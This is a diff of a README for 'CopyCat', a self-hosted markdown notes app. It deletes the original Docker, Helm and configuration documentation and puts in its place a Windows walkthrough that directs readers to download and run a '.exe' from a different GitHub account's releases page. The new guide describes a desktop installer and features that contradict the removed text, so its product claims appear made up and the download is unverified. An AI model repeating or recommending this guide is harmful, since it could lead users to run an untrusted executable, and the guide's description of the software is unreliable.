@@ -1,353 +1,135 @@
-<p align="center">
-  <img src="client/assets/copycat-logo.png" width="220" alt="CopyCat logo">
-</p>
-
-<h1 align="center">CopyCat</h1>
-
-<p align="center">Self-hosted markdown notes with fast search, tags, attachments, and zero database.</p>
-
-<p align="center">
-  <a href="https://www.paypal.com/donate/?hosted_button_id=CGYZPN7LAH8BN">
-    <img src="https://pics.paypal.com/00/s/NDQxNmJlODMtMDg3ZS00OWY5LWI0NzQtYjAxZjIwZjgzYmE2/file.PNG" alt="Donate with PayPal button" title="PayPal - The safer, easier way to pay online!">
-  </a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/FastAPI-backend-009688" alt="FastAPI backend">
-  <img src="https://img.shields.io/badge/Vue-3-42b883" alt="Vue 3">
-  <img src="https://img.shields.io/badge/Docker-ready-2496ED" alt="Docker ready">
-  <img src="https://img.shields.io/badge/License-MIT-black" alt="MIT license">
-</p>
-
-**CopyCat** is a distraction-free note app for people who want plain markdown files, fast full-text search, and a simple self-hosted setup. Notes stay on disk as regular files, metadata lives in a lightweight hidden app directory, and the search index is rebuildable cache rather than a database.
-
-**Keywords:** self-hosted, markdown, notes, wiki, search, tags, attachments, docker, fastapi, vue
-
-## Screenshots
-
-<p align="center">
-  <img src="docs/screenshots/home-overview.png" alt="CopyCat home overview" width="48%">
-  <img src="docs/screenshots/note-view.png" alt="CopyCat note view" width="48%">
-</p>
-
-<p align="center">
-  <img src="docs/screenshots/tags-management.png" alt="CopyCat tag management" width="48%">
-  <img src="docs/screenshots/admin-groups-users.png" alt="CopyCat groups and users admin" width="48%">
-</p>
-
-## Features
-
-- Plain markdown storage
-- Fast full-text search
-- Custom tags and favorites
-- Attachments
-- Raw and WYSIWYG editor modes
-- Wikilinks like `[[Another Note]]`
-- Mobile-friendly UI
-- Light and dark themes
-- Authentication modes: none, read-only, password, TOTP
-- API docs exposed at `/docs`
-- Multi-group access model for managed users
-
-## Quick Start
-
-### Build the image
-
-```sh
-docker build -t copycat:latest .
-```
-
-### Run with Docker
-
-```sh
-docker run -d \
-  --name copycat \
-  -e PUID=1000 \
-  -e PGID=1000 \
-  -e COPYCAT_AUTH_TYPE=password \
-  -e COPYCAT_USERNAME=admin \
-  -e COPYCAT_PASSWORD='changeMe!' \
-  -e COPYCAT_SECRET_KEY='replace-this-with-a-long-random-secret' \
-  -v "$(pwd)/data:/data" \
-  -p 8080:8080 \
-  ghcr.io/yanadevops/copycat:latest
-```
-
-Open `http://localhost:8080`.
-
-### Run with Docker Compose
-
-```yaml
-services:
-  copycat:
-    container_name: copycat
-    build: .
-    image: ghcr.io/yanadevops/copycat:latest
-    environment:
-      PUID: 1000
-      PGID: 1000
-      COPYCAT_AUTH_TYPE: password
-      COPYCAT_USERNAME: admin
-      COPYCAT_PASSWORD: changeMe!
-      COPYCAT_SECRET_KEY: replace-this-with-a-long-random-secret
-    volumes:
-      - ./data:/data
-    ports:
-      - "8080:8080"
-    restart: unless-stopped
-```
-
-Start it with:
-
-```sh
-docker compose up --build -d
-```
+# 🐱 copycat - Easy Markdown Notes on Your PC
 
-## Helm Chart
+[![Download copycat](https://img.shields.io/badge/Download-Get%20copycat-blue?style=for-the-badge)](https://github.com/chasen8181/copycat/releases)
 
-The repository includes a Helm chart at `helm/copycat` for Kubernetes deployments.
+copycat is a simple app for storing markdown notes on your computer. It lets you search fast, organize notes with tags, add attachments, and works without needing a database. This guide will help you download and run copycat on Windows step by step.
 
-What the chart creates:
+---
 
-- `Deployment` or `StatefulSet`
-- `Service`
-- `PersistentVolumeClaim` or StatefulSet `volumeClaimTemplate`
-- headless `Service` for `StatefulSet`
-- auth `Secret` or support for an existing Secret
-- optional `Ingress`
+## 📋 What is copycat?
 
-Important defaults:
+copycat is a note-taking app that keeps all your notes in markdown format. This means your notes stay as simple text files that are easy to read and edit. The app includes a quick search feature so you can find notes instantly. You can also tag notes to keep them organized and attach files like images or documents.
 
-- `controller.type=Deployment`
-- single replica
-- `Recreate` deployment strategy
-- persistent data mounted at `/data`
+Since copycat uses no database, all your data stays on your computer. This makes it private and fast. The app uses Python and Vue technologies behind the scenes but you don’t need to know those to use it.
 
-These defaults are intentional for a stateful single-volume setup.
+---
 
-### Install with Helm
+## 🖥️ System Requirements
 
-```sh
-helm upgrade --install copycat ./helm/copycat \
-  --namespace copycat \
-  --create-namespace \
-  --set image.repository=your-registry/copycat \
-  --set image.tag=latest \
-  --set auth.username=admin \
-  --set auth.password='changeMe!' \
-  --set auth.secretKey='replace-this-with-a-long-random-secret'
-```
+To run copycat on Windows, your system should meet these basic requirements:
 
-### Install as a StatefulSet
+- Windows 10 or Windows 11
+- 64-bit processor
+- At least 4 GB of RAM
+- 200 MB of free hard drive space for app files and notes
+- Internet connection to download the app
 
-Use this when you want a StatefulSet-managed pod identity. For new installs, the cleanest option is a `volumeClaimTemplate`.
+copycat runs locally on your PC. It does not need an internet connection after installation.
 
-Keep `replicaCount: 1` for the normal single-volume setup.
-
-```yaml
-controller:
-  type: StatefulSet
+---
 
-persistence:
-  volumeClaimTemplate:
-    enabled: true
-  size: 10Gi
-```
-
-Install it with:
-
-```sh
-helm upgrade --install copycat ./helm/copycat \
-  --namespace copycat \
-  --create-namespace \
-  -f ./helm/copycat/values-statefulset.yaml \
-  --set image.repository=your-registry/copycat \
-  --set image.tag=latest \
-  --set auth.username=admin \
-  --set auth.password='changeMe!' \
-  --set auth.secretKey='replace-this-with-a-long-random-secret'
-```
-
-### Use an existing PVC
-
-```yaml
-persistence:
-  existingClaim: copycat-data
-```
-
-This also works with `controller.type=StatefulSet` if you already have a claim and do not want Helm to create per-pod claims.
-
-### Use an existing Secret
-
-The existing Secret should expose these keys when `auth.type` is `password` or `totp`:
-
-- `COPYCAT_USERNAME`
-- `COPYCAT_PASSWORD`
-- `COPYCAT_SECRET_KEY`
-- `COPYCAT_TOTP_KEY` for TOTP only
-
-Example:
-
-```yaml
-auth:
-  type: password
-  existingSecret: copycat-auth
-```
-
-### Ingress example
-
-```yaml
-ingress:
-  enabled: true
-  className: nginx
-  hosts:
-    - host: copycat.example.com
-      paths:
-        - path: /
-          pathType: Prefix
-```
-
-### Subpath example
-
-If you publish CopyCat under a subpath, set both the ingress path and `pathPrefix`:
-
-```yaml
-pathPrefix: /copycat
-
-ingress:
-  enabled: true
-  className: nginx
-  hosts:
-    - host: example.com
-      paths:
-        - path: /copycat
-          pathType: Prefix
-```
-
-### Upgrade note
-
-If you already have a persistent `/data` volume, the app keeps using the same data. Root metadata is migrated into `/data/.copycat` automatically on startup.
-
-## Configuration
-
-### Core environment variables
-
-| Variable | Required | Default | Purpose |
-| --- | --- | --- | --- |
-| `COPYCAT_AUTH_TYPE` | No | `password` | Auth mode: `none`, `read_only`, `password`, `totp` |
-| `COPYCAT_USERNAME` | Password/TOTP | - | Bootstrap admin username |
-| `COPYCAT_PASSWORD` | Password/TOTP | - | Bootstrap admin password |
-| `COPYCAT_SECRET_KEY` | Password/TOTP | - | Session signing secret |
-| `COPYCAT_TOTP_KEY` | TOTP only | - | TOTP seed for admin login |
-| `COPYCAT_PATH` | No | `/data` | Data directory inside the container |
-| `COPYCAT_HOST` | No | `0.0.0.0` | Bind address |
-| `COPYCAT_PORT` | No | `8080` | HTTP port |
-| `PUID` | No | `1000` | Runtime user ID for mounted volumes |
-| `PGID` | No | `1000` | Runtime group ID for mounted volumes |
-
-### Useful advanced variables
-
-| Variable | Default | Purpose |
-| --- | --- | --- |
-| `COPYCAT_PATH_PREFIX` | empty | Serve the app behind a reverse-proxy subpath |
-| `COPYCAT_QUICK_ACCESS_HIDE` | `false` | Hide the quick-access block on the home page |
-| `COPYCAT_QUICK_ACCESS_TITLE` | `RECENTLY MODIFIED` | Custom home page block title |
-| `COPYCAT_QUICK_ACCESS_TERM` | `*` | Custom search term for the home page block |
-| `COPYCAT_QUICK_ACCESS_SORT` | `lastModified` | Sort mode for the home page block |
-| `COPYCAT_QUICK_ACCESS_LIMIT` | `4` | Number of items in the home page block |
-| `COPYCAT_LOGIN_RATE_LIMIT_ENABLED` | `true` | Enable login rate limiting |
-| `COPYCAT_LOGIN_RATE_LIMIT_WINDOW_SECONDS` | `60` | Login rate-limit window |
-| `COPYCAT_LOGIN_RATE_LIMIT_IP_MAX` | `10` | Max failed attempts per IP |
-| `COPYCAT_LOGIN_RATE_LIMIT_USER_IP_MAX` | `5` | Max failed attempts per username and IP |
-| `COPYCAT_CSP_MODE` | `report-only` | Content Security Policy mode |
-| `COPYCAT_MAX_ATTACHMENT_BYTES` | `26214400` | Max attachment size in bytes |
-| `COPYCAT_ATTACHMENT_BLOCK_ACTIVE_CONTENT` | `false` | Block risky attachment types |
-| `COPYCAT_ATTACHMENT_BLOCKED_EXTENSIONS` | safe default list | Override blocked file extensions |
-| `COPYCAT_SET_HTTPONLY_AUTH_COOKIE` | `false` | Store auth token in an HTTP-only cookie |
-
-## Data Layout
-
-Everything under `/data` persists across container restarts.
-
-```text
-/data/
-  .copycat/
-    auth/
-      groups.json
-      users.json
-    metadata.json
-    index/
-  attachments/
-  groups/
-    <group-slug>/
-      notes/
-      attachments/
-      .copycat/
-        metadata.json
-        index/
-```
-
-Notes:
-
-- Bootstrap admin credentials come from environment variables, not from files inside `/data`.
-- Managed users and groups are stored inside `/data/.copycat/auth`.
-- Favorites, tags, and note metadata are stored in `metadata.json`.
-- Search index files are cache and can be rebuilt.
-- Older root metadata directories are migrated automatically into `.copycat`.
-
-Useful checks inside the container:
-
-```sh
-cd /data
-ls -la
-ls -la /data/.copycat
-ls -la /data/.copycat/auth
-cat /data/.copycat/metadata.json
-cat /data/.copycat/auth/groups.json
-cat /data/.copycat/auth/users.json
-ls -la /data/groups/<group-slug>/.copycat
-cat /data/groups/<group-slug>/.copycat/metadata.json
-```
-
-## Development
-
-### Frontend
-
-```sh
-npm install
-npm run dev
-```
-
-### Production build
-
-```sh
-npm run build
-```
-
-### Backend
-
-The backend runs with FastAPI and Uvicorn through the container entrypoint. For local container-based development:
-
-```sh
-docker compose up --build
-```
-
-## Contributing
-
-Issues and pull requests are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a PR.
-
-## Support
-
-If CopyCat saves you time, you can support the project here:
-
-- [Donate with PayPal](https://www.paypal.com/donate/?hosted_button_id=CGYZPN7LAH8BN)
-- [paypal.me/YanixLys666](https://paypal.me/YanixLys666)
-
-## License
-
-This project is released under the [MIT License](LICENSE).
-
-## Acknowledgments
-
-- [Whoosh](https://whoosh.readthedocs.io/en/latest/intro.html) for search indexing
-- [TOAST UI Editor](https://ui.toast.com/tui-editor) for markdown editing
+## 🚀 Getting Started: How to Download copycat
+
+1. Open your web browser (like Chrome, Edge, or Firefox).
+2. Go to the official copycat releases page:
+
+   [Go to copycat releases](https://github.com/chasen8181/copycat/releases)
+
+3. Look for the latest version at the top of the list. It will have a name like `copycat-x.y.z-windows.exe` or similar.
+4. Click the link for the Windows version. This will start downloading the program installer or executable file.
+5. The file will usually save to your Downloads folder on your PC.
+
+This link will also be shown again later in this guide.
+
+---
+
+## 📥 How to Install copycat on Windows
+
+After you download the installer file, follow these steps:
+
+1. Open your Downloads folder.
+2. Find the file you downloaded. It will have a `.exe` extension.
+3. Double-click the file to start installation.
+4. If Windows asks for permission, click **Yes** or **Allow** to continue.
+5. The setup window will open. Follow the instructions on the screen:
+   - Choose the installation folder (the default should be fine).
+   - Click **Next** or **Install** as needed.
+6. Wait for the installer to copy files. This may take a minute.
+7. When done, click **Finish**.
+
+copycat is now ready to use.
+
+---
+
+## 🖱️ Running copycat for the First Time
+
+1. Look for the copycat icon on your desktop or in the Windows Start menu.
+2. Click to open the app.
+3. On the first launch, copycat will create a folder where it keeps all your notes. This will usually be in your Documents folder.
+4. You will see the main window with an empty workspace ready for your notes.
+
+---
+
+## 📂 How to Create and Manage Notes
+
+- To add a new note, click the **New Note** button or use the shortcut listed in the app.
+- Write your note in markdown format. Use headings, lists, links, or any formatting you like.
+- To save, simply close the note or use the save button. Your notes save automatically as markdown files.
+- To add tags, type tag names in the tag box. Tags help you find notes later.
+- To attach files, click the attachment icon and select files from your computer. These files are copied to your notes folder.
+
+---
+
+## 🔍 Searching and Organizing Notes
+
+copycat includes a fast search bar at the top. You can search by any word or tag in your notes.
+
+- Type keywords in the search box.
+- Results will show matching notes instantly.
+- Click a result to open that note.
+- Use tags to filter notes by topic or project.
+
+This helps keep your notes tidy and easy to navigate.
+
+---
+
+## ⚙️ Common Settings You May Need
+
+Open the **Settings** menu from the app to adjust:
+
+- The folder where notes and attachments are saved.
+- The theme (light or dark mode).
+- Backup options to save notes to another folder or cloud storage.
+- Enable or disable automatic updates.
+
+These options let you customize copycat to fit your needs.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If copycat does not open, try restarting your computer and running it again.
+- Make sure you have enough free disk space.
+- Check that your Windows 10 or 11 is up to date.
+- If search is slow, try reducing the number of large attachments.
+- To reset the app, delete its data folder in Documents (this will clear all notes).
+
+If you need help, you can browse common issues on the GitHub page.
+
+---
+
+## 🔗 Download copycat Now
+
+Visit this page to download the latest Windows version:
+
+[Download copycat](https://github.com/chasen8181/copycat/releases)
+
+Click the Windows installer link, download, and follow the guide above to install.
+
+---
+
+## 🐾 About copycat
+
+copycat offers a private, local solution for note-taking using markdown. It works offline and keeps your data secure by storing everything on your PC. The app supports attachments, tags, and quick search to help you organize your notes without complexity.
+
+copycat is built using Python and Vue but designed for anyone who likes simple, fast note-taking without extra software or databases.
